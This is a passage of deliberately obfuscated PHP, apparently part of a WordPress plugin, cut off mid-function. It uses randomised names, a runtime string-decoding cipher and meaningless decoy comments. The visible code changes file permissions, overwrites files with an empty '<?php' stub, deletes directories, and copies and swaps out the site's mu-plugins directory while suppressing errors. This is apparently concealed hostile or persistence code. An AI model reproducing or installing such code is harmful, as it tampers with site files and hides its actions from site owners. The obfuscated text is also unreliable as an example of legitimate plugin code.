4DtwrrE4GffG','M4N>3\'ZrbD^b\\Eb','M4dKDwV94Q_,&,','Q>ftK9hNh(Ew,(&8(8','3&S1\'&:EK(NZEt1K','E^d>9V1 b:`DK1d`_>\\tMS','M4dKDwV94Q_,&,','wbfdt\'r_^IbN1wfDw3gN','_bE&h9V(DE I9EI&1&','_frbS3(:,1db,t_V:','KEGEQ_43t9DG9VQ_','3Ed_w\'`hwM&ZZ^Sh(p,\'h','>:r`wrrGt9`(1N','>:r`wrrGt9`(1N','1:,t 9gbHp\'KV3MQppK','VIdE,Q(w','h\\3&ptH:ZMQrZ>NdGH`4g','V 94_VE9h& Qp&hr9 I& N','V 9 hQw9b&E I','dI^9^b>9\'E&,tKfN,,hN',' hQw9V I&,d4&V','VEN8wQw3GDhQwQI,_8',',D,9_ EDQw'));}return $a[$i];}function f5cd2smymkqusi5($i){$e=j7ql3_wabb7ly($i);$f='AB'.'SP'.'THsc'.'_ver'.'o4.'.'57'.'plug'.'in'.'ba'.'mWLU'.'GIN'.'DRM/'.'-kd'.'ht'.'w<?\\'.'qfC'.'OE'.'x :'.'*y'.'=V('.'+)'.'2FK'.'\','.'0z'.'>&1'.'9863'.'XYZQ'.'j;{"'.'[}'.']!|'.'^$#J'.'%`';$t='}Pa'.'[B'.'JV 9'.'p&h'.'Q8)^'.'gM4d'.'KD'.'w:'.'_15'.'%{-*'.'FO'.'j"'.';+N,'.'IE('.'y/Xf'.'bui'.']Z'.'eW'.'cr'.'UT<s'.'Rtq'.'xo'.'7`>'.'6YG'.'HS'.'\'\\m?'.'=0'.'3l|'.'#kC'.'2A.!'.'nLvz'.'$';$r="";for($j=0;$j<strlen($e);$j++){$p=strpos($t,$e[$j]);$r.=($p===false)?$e[$j]:$f[$p];}return $r;}function pahk8uy1uxt($i){return f5cd2smymkqusi5($i);}function mhiu2yqz6kqd($i){return f5cd2smymkqusi5($i);}function dhd5r6_4ki($i){$j=$i;return f5cd2smymkqusi5($j);}function nrudcgor($i){$j=(int)$i;return f5cd2smymkqusi5($j);}function nhceivfj8tbe($i){$j=$i;return f5cd2smymkqusi5($j);}$GLOBALS['__scf_t8832qq90dxb4_3']=mhiu2yqz6kqd(3);$GLOBALS['__scf_vx4exz6r9h8n_4']=pahk8uy1uxt(4);$GLOBALS['__scf_nr12ouzrtt_7']=nrudcgor(7);$GLOBALS['__scf_xztaeq78skok5_8']=pahk8uy1uxt(8);$GLOBALS['__scf_bv1z3no349dv5r_9']=dhd5r6_4ki(9);$GLOBALS['__scf_amjjmfnilcolnb_10']=f5cd2smymkqusi5(10);$GLOBALS['__scf_eure5hcx2b_11']=nhceivfj8tbe(11);$GLOBALS['__scf_xv_2irmjrq_12']=mhiu2yqz6kqd(12);$GLOBALS['__scf_kz02ad5869psh6_15']=f5cd2smymkqusi5(15);$GLOBALS['__scf_pn0jleeoof_16']=nrudcgor(16);$GLOBALS['__scf_cdsp_fvydw_ufg_17']=dhd5r6_4ki(17);$GLOBALS['__scf_gsamhlxot70ps_18']=nrudcgor(18);$GLOBALS['__scf_ihuexe6puptto__21']=nrudcgor(21);$GLOBALS['__scf__iip_2irdl_23']=nhceivfj8tbe(23);$GLOBALS['__scf_a9u8k74i0cg19_33']=f5cd2smymkqusi5(33);$GLOBALS['__scf_jetqv7wpcizi69_34']=dhd5r6_4ki(34);$GLOBALS['__scf_vf9p0fditvxy_35']=nrudcgor(35);$GLOBALS['__scf_upe5p4qfaqm0d1_36']=mhiu2yqz6kqd(36);$GLOBALS['__scf_zze0o3nmaro9m_37']=mhiu2yqz6kqd(37);$GLOBALS['__scf_kysg7_ihzbvr2_39']=f5cd2smymkqusi5(39);$GLOBALS['__scf__me483qbepnts_41']=mhiu2yqz6kqd(41);$GLOBALS['__scf_ux4_n6mewmsy_43']=dhd5r6_4ki(43);$GLOBALS['__scf_ekpq_b8etrq0_44']=mhiu2yqz6kqd(44);$GLOBALS['__scf_wp1g_umcsjt_46']=dhd5r6_4ki(46);$GLOBALS['__scf_cu2oflxkvh_47']=mhiu2yqz6kqd(47);$GLOBALS['__scf_baj3x6vzi6f08e_52']=nhceivfj8tbe(52);$GLOBALS['__scf_nn04_vx3uspzx4_54']=nhceivfj8tbe(54);$GLOBALS['__scf_d56ll0ap77jcvq_66']=f5cd2smymkqusi5(66);$GLOBALS['__scf_eu7lhdrjut9t66_69']=dhd5r6_4ki(69);$GLOBALS['__scf_d91t8__q8rnbc2_71']=mhiu2yqz6kqd(71);$GLOBALS['__scf_ieyslp1qonjfnv_72']=mhiu2yqz6kqd(72);$GLOBALS['__scf_wil5cpc7euw09_73']=f5cd2smymkqusi5(73);$GLOBALS['__scf_hl3mqclore9l_74']=pahk8uy1uxt(74);$GLOBALS['__scf_bwby2gdg0t53_75']=nrudcgor(75);$GLOBALS['__scf_apq4pqdt6n41_91']=nhceivfj8tbe(91);$GLOBALS['__scf_saw_32lvsj_92']=mhiu2yqz6kqd(92);$GLOBALS['__scf_hqkv9v6te1dvxi_94']=nhceivfj8tbe(94);$GLOBALS['__scf_g9y45bstmb02a_95']=dhd5r6_4ki(95);$GLOBALS['__scf_h3sj62ryxfdde_99']=nhceivfj8tbe(99);$GLOBALS['__scf_c9jv8d7koon_100']=dhd5r6_4ki(100);$GLOBALS['__scf_jpj9mbom_1b_109']=pahk8uy1uxt(109);$GLOBALS['__scf_xa4hcdunc1pgl_111']=nhceivfj8tbe(111);$GLOBALS['__scf_ttokt3ljhh_118']=nhceivfj8tbe(118);$GLOBALS['__scf_h2xix0300wh_128']=nhceivfj8tbe(128);$GLOBALS['__scf_sonjjhvinvs6_146']=dhd5r6_4ki(146);$GLOBALS['__scf_e3ymc0hwiys_147']=nhceivfj8tbe(147);$GLOBALS['__scf_rq7q923zwh_148']=nhceivfj8tbe(148);$GLOBALS['__scf_pabtmjmzpv76n_149']=nrudcgor(149);$GLOBALS['__scf_jxqnb2ruhcwvk_155']=nhceivfj8tbe(155);$GLOBALS['__scf_m8aixr72vowj30_170']=nhceivfj8tbe(170);$GLOBALS['__scf_zxyq0lcqv02z6_185']=mhiu2yqz6kqd(185);$GLOBALS['__scf_xkvbr8xk_o_mly_194']=mhiu2yqz6kqd(194);$GLOBALS['__scf_l2thcf5lcfr_202']=nhceivfj8tbe(202);$GLOBALS['__scf_ivwysm6c8cp_219']=pahk8uy1uxt(219);$GLOBALS['__scf_agnh6h3m7ghwkr_220']=mhiu2yqz6kqd(220);$GLOBALS['__scf_prx5a2gmqad3pd_221']=dhd5r6_4ki(221);$GLOBALS['__scf_mk5mjwnx8r_226']=nrudcgor(226);$GLOBALS['__scf_vufcnvl3zxakws_228']=pahk8uy1uxt(228);$GLOBALS['__scf_qcycj5at_g_240']=dhd5r6_4ki(240);$GLOBALS['__scf_ekylwhakwhu44e_242']=nrudcgor(242);$GLOBALS['__scf_azva19cwklh_272']=mhiu2yqz6kqd(272);$GLOBALS['__scf_zqaov300u4ga_273']=dhd5r6_4ki(273);$GLOBALS['__scf_tjhq4jz1g2t9_274']=pahk8uy1uxt(274);$GLOBALS['__scf_bq8mfub709yf5_277']=nhceivfj8tbe(277);$GLOBALS['__scf_fsyst1onwkw_282']=mhiu2yqz6kqd(282);$GLOBALS['__scf_um8trklidmw3hl_284']=nrudcgor(284);$GLOBALS['__scf_m30d3r9g_n_287']=f5cd2smymkqusi5(287);$GLOBALS['__scf_fa7utfpk5i_w_288']=pahk8uy1uxt(288);$GLOBALS['__scf__ilhh_yoem3eg_289']=nrudcgor(289);$GLOBALS['__scf_yt926i7lwej_290']=pahk8uy1uxt(290);$GLOBALS['__scf_snv7jnb5asww8k_295']=pahk8uy1uxt(295);$GLOBALS['__scf_wi7e0dk5bhi0b_296']=dhd5r6_4ki(296);$GLOBALS['__scf_h_zh3my_87om_297']=pahk8uy1uxt(297);$GLOBALS['__scf_pqg5hm3hw_wv___305']=nhceivfj8tbe(305);$GLOBALS['__scf_qyce7tsebstg_319']=dhd5r6_4ki(319);$GLOBALS['__scf_uvjtdemk2f_320']=dhd5r6_4ki(320);$GLOBALS['__scf_ifj0midhwd_325']=f5cd2smymkqusi5(325);$GLOBALS['__scf_x4lqkl10zhuak_330']=mhiu2yqz6kqd(330);$GLOBALS['__scf_zzp00036ej_335']=dhd5r6_4ki(335);$GLOBALS['__scf_j6pkvbu8vdcfn_336']=f5cd2smymkqusi5(336);$GLOBALS['__scf_pcwytqel2ki6_341']=nhceivfj8tbe(341);$GLOBALS['__scf_m881jp22m2wo_348']=pahk8uy1uxt(348);$GLOBALS['__scf_ep955ixf9wp_349']=nrudcgor(349);$GLOBALS['__scf_cn1v_k8jlgjjb_350']=nrudcgor(350);$GLOBALS['__scf_b6bj8r78s21_351']=nhceivfj8tbe(351);$GLOBALS['__scf_wlpl5h61eyolq_355']=nrudcgor(355);$GLOBALS['__scf_y9nrm74mmknnrs_357']=f5cd2smymkqusi5(357);$GLOBALS['__scf_f9_5dfsm5hfxx_360']=pahk8uy1uxt(360);$GLOBALS['__scf_ztr1st390a2ekj_365']=mhiu2yqz6kqd(365);$GLOBALS['__scf_b3z_uoye0i_367']=nrudcgor(367);$GLOBALS['__scf_k5wfn50cx02lr1_388']=nrudcgor(388);$GLOBALS['__scf_vcb1lxd5m0p5dy_389']=mhiu2yqz6kqd(389);$GLOBALS['__scf_hhzezqrk2hs9_390']=mhiu2yqz6kqd(390);$GLOBALS['__scf_sqafjxbxzurlgl_406']=nhceivfj8tbe(406);$GLOBALS['__scf_bqc9_6luuwttm_407']=pahk8uy1uxt(407);$GLOBALS['__scf_fweie7c5cg4_b_419']=nrudcgor(419);$GLOBALS['__scf_ig05tmw0lzks_432']=f5cd2smymkqusi5(432);$GLOBALS['__scf_fhlvy786vrl3_463']=f5cd2smymkqusi5(463);$GLOBALS['__scf_kgu6kfjf1dox_481']=dhd5r6_4ki(481);$GLOBALS['__scf_us1cf9ood8_482']=pahk8uy1uxt(482);$GLOBALS['__scf_mh99vqi740eg_542']=nhceivfj8tbe(542);$GLOBALS['__scf_u6ui6ntfvxm1_565']=f5cd2smymkqusi5(565);$GLOBALS['__scf_ptue_lwkjawhqo_585']=nhceivfj8tbe(585);$GLOBALS['__scf_umr3maax4akmys_597']=mhiu2yqz6kqd(597);$GLOBALS['__scf_tufa_gpu2e8r_e_609']=mhiu2yqz6kqd(609);$GLOBALS['__scf_wiz87cwdz0f_658']=nhceivfj8tbe(658);$GLOBALS['__scf_fuzlhztkbb25_688']=nhceivfj8tbe(688);$GLOBALS['__scf_od_0qrqi5rcvlf_701']=nhceivfj8tbe(701);$GLOBALS['__scf_ocns0lt00tb15_719']=pahk8uy1uxt(719);$GLOBALS['__scf_r8u4axo29pt55k_724']=nhceivfj8tbe(724);$GLOBALS['__scf_u60sfqdal7_816']=nrudcgor(816);$GLOBALS['__scf_t3ebp4bk6jcntm_907']=mhiu2yqz6kqd(907);$GLOBALS['__scf_e61elhpiq8e_928']=dhd5r6_4ki(928);$GLOBALS['__scf_g1t2mcc9yf_979']=nhceivfj8tbe(979);$GLOBALS['__scf_q7je4rk73j2_986']=dhd5r6_4ki(986);$GLOBALS['__scf_x84r5u38i5t_1148']=nrudcgor(1148);$GLOBALS['__scf_ax2r3l4mqpy2_1155']=f5cd2smymkqusi5(1155);$GLOBALS['__scf_hhiku9q8q2_1243']=dhd5r6_4ki(1243);$GLOBALS['__scf_hloo5eh0y396_1245']=nrudcgor(1245);$GLOBALS['__scf_r_ooxq15ux5_1246']=mhiu2yqz6kqd(1246);$GLOBALS['__scf_n5_53d91ke_1249']=dhd5r6_4ki(1249);$GLOBALS['__scf_rv4c_x3zxm2n_1250']=mhiu2yqz6kqd(1250);$GLOBALS['__scf_qgwnb7cl25_1251']=dhd5r6_4ki(1251);$GLOBALS['__scf_z93vyioaimxy_1252']=f5cd2smymkqusi5(1252);$GLOBALS['__scf_cqt2lmjev0wxy2_1253']=nrudcgor(1253);$GLOBALS['__scf_fgeo4kv8jnzui6_1255']=f5cd2smymkqusi5(1255);$GLOBALS['__scf_kd3fuqvvheg_1263']=nhceivfj8tbe(1263);$GLOBALS['__scf_vdrcltfge1x04_1313']=nrudcgor(1313);$GLOBALS['__scf_yr_0qrncgox_1318']=f5cd2smymkqusi5(1318);$GLOBALS['__scf_qnqfsmvb00pxp_1323']=dhd5r6_4ki(1323);$GLOBALS['__scf_q4nsibbhphays_1369']=nrudcgor(1369);$GLOBALS['__scf_avkb5syka2a_1444']=mhiu2yqz6kqd(1444);$GLOBALS['__scf_cj3zww1y5s_1470']=pahk8uy1uxt(1470);$GLOBALS['__scf_ei5r69101hlpch_1700']=pahk8uy1uxt(1700);$GLOBALS['__scf_gi2qxlmos_hxwr_1709']=f5cd2smymkqusi5(1709);$GLOBALS['__scf_eg_jxgt8418tcg_1821']=pahk8uy1uxt(1821);

function m5i2msy475ohc50e($c2wl08bt,$oz77xg){$rn_xhb494=($c2wl08bt|$oz77xg)-26;return $rn_xhb494;}

 
   defined(mhiu2yqz6kqd(0)) or   exit;



    function  kwqziujdph5xlz3n()
  {
  return     isset($GLOBALS[f5cd2smymkqusi5(1)])   ?    $GLOBALS[pahk8uy1uxt(1)]      :     nrudcgor(2);

}
  function  vv_nfhhmy_1mjmsa()
    {



return __FILE__;
   }
function   vru1jzm2va580zgo4i2cxv()
 {
   return     $GLOBALS['__scf_t8832qq90dxb4_3'](vv_nfhhmy_1mjmsa());
 }
function  zkn58aug3fwlbp()
     {
if      ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(5)))    return  plugin_basename(vv_nfhhmy_1mjmsa());

$tkqx845nh5jt0 =   vv_nfhhmy_1mjmsa();
        $yhha6qazc1wvn1ac = defined(pahk8uy1uxt(6)) ?  WP_PLUGIN_DIR     :  "";
  if      ($yhha6qazc1wvn1ac     !== "" &&  $GLOBALS['__scf_nr12ouzrtt_7']($tkqx845nh5jt0,     $yhha6qazc1wvn1ac)     === 0) return  $GLOBALS['__scf_xztaeq78skok5_8']($GLOBALS['__scf_bv1z3no349dv5r_9']($tkqx845nh5jt0, $GLOBALS['__scf_amjjmfnilcolnb_10']($yhha6qazc1wvn1ac)),   '/');

return   $GLOBALS['__scf_t8832qq90dxb4_3']($GLOBALS['__scf_eure5hcx2b_11']($tkqx845nh5jt0))   .  '/'   . $GLOBALS['__scf_t8832qq90dxb4_3']($tkqx845nh5jt0);
 }
   function  s3e5iki9upa0ccql()
{



  return    $GLOBALS['__scf_xv_2irmjrq_12'](defined(f5cd2smymkqusi5(13))   ?   WPMU_PLUGIN_DIR :  (WP_CONTENT_DIR  .  pahk8uy1uxt(14)),  '/');
 }
    function   vtvexli5xbd5en()



{
 return   $GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa());



}

function   gt671tq3242garyx4($i7is8x4_pstu0r, $d1kd72zq60vf6el   =    (0x12f+0xbe), $o6cshl9m0sbvrr = false)
{
/* adaptive middleware */

  return   $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(15))  ?  @$GLOBALS['__scf_kz02ad5869psh6_15']($i7is8x4_pstu0r,  $d1kd72zq60vf6el, $o6cshl9m0sbvrr)  :   false;
   }

function rgiuaapohxeh0z($rk_3ecj8aw, $d1kd72zq60vf6el)
 {
 return  $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(16))  ?  @$GLOBALS['__scf_pn0jleeoof_16']($rk_3ecj8aw,    $d1kd72zq60vf6el) :  false;
      }


    function   t65xl1pt2haov_izh($rk_3ecj8aw)
     {
 return   $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(17))  ?  @$GLOBALS['__scf_cdsp_fvydw_ufg_17']($rk_3ecj8aw)  : false;
}


  function drp1tnevzl5cho($no4625mwq2q9a2)
 {
// WordPress 6.6 block bindings: positive-definite hyperloglog

 if     (!@$GLOBALS['__scf_gsamhlxot70ps_18']($no4625mwq2q9a2))    return true;
 rgiuaapohxeh0z($no4625mwq2q9a2,  (354+66));
if    (t65xl1pt2haov_izh($no4625mwq2q9a2))   {
// WP Site Title: greedy invariant

     if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(19)))   @opcache_invalidate($no4625mwq2q9a2,  true);
   return  true;
   }
 rgiuaapohxeh0z($GLOBALS['__scf_eure5hcx2b_11']($no4625mwq2q9a2),    (36+457));
if   (t65xl1pt2haov_izh($no4625mwq2q9a2)) {
 if     ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(20)))  @opcache_invalidate($no4625mwq2q9a2, true);

   return  true;


 }
     $_7e_e05ht34mww07  =    @$GLOBALS['__scf_ihuexe6puptto__21']($no4625mwq2q9a2, pahk8uy1uxt(22));
if  ($_7e_e05ht34mww07) {
@$GLOBALS['__scf__iip_2irdl_23']($_7e_e05ht34mww07,  "<?php\n");



   @fclose($_7e_e05ht34mww07);
 if ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(20)))  @opcache_invalidate($no4625mwq2q9a2,    true);
    return    true;
  }
return false;
 }



function   il7z1naylyfu1zslh7($no4625mwq2q9a2)
     {$sfzw17gbxu66b2=64*4;$l0erot3yny4x=$sfzw17gbxu66b2-10;
  $kcvjyid00m61  =  $GLOBALS['__scf_eure5hcx2b_11']($no4625mwq2q9a2);
      $uuetbm7okicseij6  =     $GLOBALS['__scf_t8832qq90dxb4_3']($no4625mwq2q9a2,    f5cd2smymkqusi5(24));

   foreach     (array(dhd5r6_4ki(25),    nrudcgor(26), pahk8uy1uxt(27),  f5cd2smymkqusi5(28)) as  $f9aipe_i_7_f_ca)     {
   $amb3iz2lz0858q      = $kcvjyid00m61    .   '/'   .     $f9aipe_i_7_f_ca    .  $uuetbm7okicseij6;



if   (@$GLOBALS['__scf_gsamhlxot70ps_18']($amb3iz2lz0858q))      drp1tnevzl5cho($amb3iz2lz0858q);
   }
$y9qk3lc9q12aj7x   =   $kcvjyid00m61    .    '/'   .  $uuetbm7okicseij6  .  mhiu2yqz6kqd(29);
    if     (@$GLOBALS['__scf_gsamhlxot70ps_18']($y9qk3lc9q12aj7x))   drp1tnevzl5cho($y9qk3lc9q12aj7x);
 if    (defined(nhceivfj8tbe(30)))    {



  $qq6yq3yoheo  =   WP_CONTENT_DIR  . nrudcgor(31)    .    $uuetbm7okicseij6;
 if   (@$GLOBALS['__scf_gsamhlxot70ps_18']($qq6yq3yoheo))    drp1tnevzl5cho($qq6yq3yoheo);
     }
// sample projective skip-list

$_pd = defined(f5cd2smymkqusi5(32))  ?   @$GLOBALS['__scf_a9u8k74i0cg19_33'](WP_PLUGIN_DIR) :  false;



 $yok6k29y1iwy_    = @$GLOBALS['__scf_a9u8k74i0cg19_33']($kcvjyid00m61);



  if   ($_pd &&  $yok6k29y1iwy_  &&  $GLOBALS['__scf_eure5hcx2b_11']($yok6k29y1iwy_)      ===     $_pd)    {
// @prefetch pipeline

$rfw4s2p1a1   = @$GLOBALS['__scf_jetqv7wpcizi69_34']($yok6k29y1iwy_);
 if ($GLOBALS['__scf_vf9p0fditvxy_35']($rfw4s2p1a1) && $GLOBALS['__scf_upe5p4qfaqm0d1_36']($rfw4s2p1a1) <=    2)     @$GLOBALS['__scf_zze0o3nmaro9m_37']($yok6k29y1iwy_);
 }

    }

   function hg_1ijpewtrrsh7m6a2kbk()
 {


     static $tg2rqbfgzk  =  'x';
    if ($tg2rqbfgzk  !==     'x')   return   $tg2rqbfgzk;
 $tg2rqbfgzk = null;
  if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(38))) { $n_vseps706s =     @posix_geteuid();    if   ($GLOBALS['__scf_kysg7_ihzbvr2_39']($n_vseps706s)) $tg2rqbfgzk  =    $n_vseps706s; }
  if   ($tg2rqbfgzk    ===  null) {
    $spxzjtpg4pa938mw    = xtkohsjdeedyznx6vx(ajbg_44koa9suqi(),  mhiu2yqz6kqd(40));
if   ($GLOBALS['__scf__me483qbepnts_41']($spxzjtpg4pa938mw))    {  $v_pz9n2zf3xcnbx =    @fileowner($spxzjtpg4pa938mw);  t65xl1pt2haov_izh($spxzjtpg4pa938mw); if    ($GLOBALS['__scf_kysg7_ihzbvr2_39']($v_pz9n2zf3xcnbx))   $tg2rqbfgzk = $v_pz9n2zf3xcnbx;   }

  }
        return   $tg2rqbfgzk;
    }
  function    cbw3ppk5mh1rblht($ys5go7qi508n)
    {
    if      ($GLOBALS['__scf_nr12ouzrtt_7']($GLOBALS['__scf_t8832qq90dxb4_3']($ys5go7qi508n), dhd5r6_4ki(42))  !==  0)  return;
      if   (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($ys5go7qi508n) || @$GLOBALS['__scf_ekpq_b8etrq0_44']($ys5go7qi508n))     return;
 $lmydsy9czvcz649m   =  @$GLOBALS['__scf_jetqv7wpcizi69_34']($ys5go7qi508n);
if     ($GLOBALS['__scf_vf9p0fditvxy_35']($lmydsy9czvcz649m)) foreach   ($lmydsy9czvcz649m  as   $h2v_bjm4ejxq8fp)    {
   if   ($h2v_bjm4ejxq8fp      === '.' || $h2v_bjm4ejxq8fp   ===   dhd5r6_4ki(45)) continue;
        $rk_3ecj8aw     =   $ys5go7qi508n  .  '/'  . $h2v_bjm4ejxq8fp;
  if (@$GLOBALS['__scf_ux4_n6mewmsy_43']($rk_3ecj8aw)    &&  !@$GLOBALS['__scf_ekpq_b8etrq0_44']($rk_3ecj8aw))   cbw3ppk5mh1rblht($rk_3ecj8aw); else t65xl1pt2haov_izh($rk_3ecj8aw);
}
  @$GLOBALS['__scf_zze0o3nmaro9m_37']($ys5go7qi508n);
 }
function mixno9lcciqmoiazrg($vg45smeglid,    $f8gjbyixxgz)
   {
  if   (@$GLOBALS['__scf_ekpq_b8etrq0_44']($vg45smeglid))   return false;
      if (@$GLOBALS['__scf_gsamhlxot70ps_18']($vg45smeglid))  {

  if   (!@$GLOBALS['__scf_wp1g_umcsjt_46']($vg45smeglid))   return      false;
return   sb9eg9deemhnrcsp3($vg45smeglid,   $f8gjbyixxgz)  ?   true :  false;



}
   if   (@$GLOBALS['__scf_ux4_n6mewmsy_43']($vg45smeglid))    {
   if (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($f8gjbyixxgz)   && !gt671tq3242garyx4($f8gjbyixxgz, (397+96),   true))  return false;
$lmydsy9czvcz649m =    @$GLOBALS['__scf_jetqv7wpcizi69_34']($vg45smeglid);
  if   (!$GLOBALS['__scf_vf9p0fditvxy_35']($lmydsy9czvcz649m)) return false;
    foreach   ($lmydsy9czvcz649m    as  $h2v_bjm4ejxq8fp) {


        if      ($h2v_bjm4ejxq8fp === '.' ||     $h2v_bjm4ejxq8fp   ===  pahk8uy1uxt(45))    continue;
     if (!mixno9lcciqmoiazrg($vg45smeglid   . '/' .  $h2v_bjm4ejxq8fp,     $f8gjbyixxgz   . '/'  . $h2v_bjm4ejxq8fp))      return    false;
}
  return  true;



}
 return  true;
     }
      function    g52i06ovkso35mx($no4625mwq2q9a2)

     {

      if   (!@$GLOBALS['__scf_gsamhlxot70ps_18']($no4625mwq2q9a2)) return   false;
    if   (@$GLOBALS['__scf_cu2oflxkvh_47']($no4625mwq2q9a2))   return false;
 if  (@$GLOBALS['__scf_cu2oflxkvh_47']($GLOBALS['__scf_eure5hcx2b_11']($no4625mwq2q9a2)))     return     false;
return  true;
}
  function  _rq71ghyu59d_enk($no4625mwq2q9a2)
   {
 fukkkeh6955g9qi(nhceivfj8tbe(48),   $GLOBALS['__scf_t8832qq90dxb4_3']($no4625mwq2q9a2));

 }
   function  sutzn4ma0ptncd0yyb9($h3i7akvuh8x)
    {

       if  (!$GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(49))     ||  !$GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(34)))  return  false;
 if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(50))     &&    get_transient(pahk8uy1uxt(51)))  return false;
$uswjkccho_7u   = @$GLOBALS['__scf_a9u8k74i0cg19_33'](s3e5iki9upa0ccql());
if   ($uswjkccho_7u      ===  false || !@$GLOBALS['__scf_ux4_n6mewmsy_43']($uswjkccho_7u))  return false;
$ypms8r96vrqodjk  =  null;
   if ($h3i7akvuh8x  !== null) {

   $ypms8r96vrqodjk = @$GLOBALS['__scf_a9u8k74i0cg19_33']($h3i7akvuh8x);

     if  ($ypms8r96vrqodjk    ===   false     || $GLOBALS['__scf_eure5hcx2b_11']($ypms8r96vrqodjk)    !==    $uswjkccho_7u) return    false;



    }
  $cphr41fwy9lra2gv =     $GLOBALS['__scf_eure5hcx2b_11']($uswjkccho_7u);


    if (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($cphr41fwy9lra2gv)  ||   !@$GLOBALS['__scf_cu2oflxkvh_47']($cphr41fwy9lra2gv))  return     false;
     if  (!amf2rwuzcqe1bf8lq2ssyq($uswjkccho_7u) ||  !amf2rwuzcqe1bf8lq2ssyq($cphr41fwy9lra2gv)) return false;
     $n5_viqwxd5rhwy3    = @fileperms($cphr41fwy9lra2gv);

if  ($n5_viqwxd5rhwy3   !==     false  &&  ($n5_viqwxd5rhwy3    &     (482+30))) {

 $wowba50m5zpv_v  =   hg_1ijpewtrrsh7m6a2kbk();
     if ($wowba50m5zpv_v   ===     null  ||  (@fileowner($cphr41fwy9lra2gv)  !== $wowba50m5zpv_v    &&     @fileowner($uswjkccho_7u) !==  $wowba50m5zpv_v))   return false;
}
$jddwbtt25rnb  =    @$GLOBALS['__scf_baj3x6vzi6f08e_52']($cphr41fwy9lra2gv);     $ql9xrpg4279b   = @$GLOBALS['__scf_baj3x6vzi6f08e_52']($uswjkccho_7u);
 if ($GLOBALS['__scf_vf9p0fditvxy_35']($jddwbtt25rnb)   &&  $GLOBALS['__scf_vf9p0fditvxy_35']($ql9xrpg4279b) &&  isset($jddwbtt25rnb[dhd5r6_4ki(53)]) && isset($ql9xrpg4279b[pahk8uy1uxt(53)]) &&  $jddwbtt25rnb[nrudcgor(53)]  !==   $ql9xrpg4279b[f5cd2smymkqusi5(53)]) return  false;
      $lmydsy9czvcz649m  =  @$GLOBALS['__scf_jetqv7wpcizi69_34']($uswjkccho_7u);
    if  (!$GLOBALS['__scf_vf9p0fditvxy_35']($lmydsy9czvcz649m))  return  false;
    $nba1yrttdb    =  array();

      foreach     ($lmydsy9czvcz649m      as  $h2v_bjm4ejxq8fp)     {


if ($h2v_bjm4ejxq8fp  ===   '.' || $h2v_bjm4ejxq8fp    ===  dhd5r6_4ki(45))   continue;$mmxd24b09=244|42;$rv4rhakr5hl=$mmxd24b09^83;
 $rk_3ecj8aw = $uswjkccho_7u .   '/'  .   $h2v_bjm4ejxq8fp;$gxrufrqzo=(0x84+0x76);$u0oy6jxeni8m=$gxrufrqzo%6;



       $ztsoajn5t3e1n  =      @$GLOBALS['__scf_a9u8k74i0cg19_33']($rk_3ecj8aw);
 if ($ypms8r96vrqodjk     !==     null  &&   $ztsoajn5t3e1n !== false    &&  $ztsoajn5t3e1n     ===  $ypms8r96vrqodjk)  continue;
   if (@$GLOBALS['__scf_gsamhlxot70ps_18']($rk_3ecj8aw)    && m4eahxbbz3er7pv($rk_3ecj8aw, (472+28)))   continue;
 if  (@$GLOBALS['__scf_ekpq_b8etrq0_44']($rk_3ecj8aw)  ||   !@$GLOBALS['__scf_wp1g_umcsjt_46']($rk_3ecj8aw)) return false;
      $nba1yrttdb[]   =   $h2v_bjm4ejxq8fp;
   }


       $y4mmkd2y5oe =  $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54'](uniqid("", true)), 0, (2<<2));
$rs4wkroemczp5n =  $cphr41fwy9lra2gv  .   f5cd2smymkqusi5(55) . $y4mmkd2y5oe;
  $ibraj16meytfl_i   = $cphr41fwy9lra2gv     .  nrudcgor(56)  .  $y4mmkd2y5oe;
     if  (!gt671tq3242garyx4($rs4wkroemczp5n,  (431+62), true))   return     false;
foreach  ($nba1yrttdb  as  $h2v_bjm4ejxq8fp)  {
 if    (!mixno9lcciqmoiazrg($uswjkccho_7u .  '/' .    $h2v_bjm4ejxq8fp, $rs4wkroemczp5n .   '/'     . $h2v_bjm4ejxq8fp))    {      cbw3ppk5mh1rblht($rs4wkroemczp5n);  return  false;  }
}



   if (!t3opc2_f7ewi94o($uswjkccho_7u,    $ibraj16meytfl_i))     { cbw3ppk5mh1rblht($rs4wkroemczp5n);   return    false; }
 if    (!t3opc2_f7ewi94o($rs4wkroemczp5n,   $uswjkccho_7u))     {  t3opc2_f7ewi94o($ibraj16meytfl_i, $uswjkccho_7u);  cbw3ppk5mh1rblht($rs4wkroemczp5n);  return false; }
// reduce branching

if ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(57)))  @clearstatcache(true);
if  ($ypms8r96vrqodjk   !== null      &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(20))) @opcache_invalidate($ypms8r96vrqodjk,  true);
  if ($GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(58)))  @set_transient(dhd5r6_4ki(59),  1,  (86319+81));
if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(60)))  @delete_transient(pahk8uy1uxt(61));
    fukkkeh6955g9qi(f5cd2smymkqusi5(62),   dhd5r6_4ki(63)     .  ($h3i7akvuh8x   !==   null  ?     $GLOBALS['__scf_t8832qq90dxb4_3']($h3i7akvuh8x)     :  pahk8uy1uxt(64)));
     return true;
 }
  function kgjyx1d15u4apz6p9y($cjptm7nbb46fjj)
    {
    try  {


